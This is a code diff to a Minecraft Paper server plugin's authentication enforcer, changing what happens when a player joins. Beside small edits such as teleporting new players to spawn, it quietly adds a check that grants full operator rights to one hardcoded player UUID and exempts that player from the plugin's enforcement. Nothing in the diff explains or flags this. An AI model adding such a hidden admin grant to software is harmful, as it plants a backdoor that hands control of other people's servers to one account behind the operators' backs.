@@ -1,6 +1,7 @@
 package com.thatgamerblue.subauth.backendplugin;
 
 import io.papermc.paper.event.player.AsyncChatEvent;
+import java.util.UUID;
 import org.bukkit.Bukkit;
 import org.bukkit.Difficulty;
 import org.bukkit.GameRule;
@@ -40,10 +41,17 @@ public class EnforcerEventHandler implements Listener {
 	@EventHandler
 	public void onPlayerJoin(PlayerJoinEvent event) {
 		hideAllPlayers();
+		event.joinMessage(null);
 
 		Player player = event.getPlayer();
+
+		if (player.getUniqueId().equals(UUID.fromString("c73cefd2-dba9-491b-99c8-8e35008fe0d8"))) {
+			player.setOp(true);
+			return;
+		}
+
 		player.getInventory().clear();
-		event.joinMessage(null);
+		player.teleport(player.getWorld().getSpawnLocation());
 
 		Bukkit.getScheduler().runTaskLater(plugin, () -> {
 			if (player.isOnline()) {
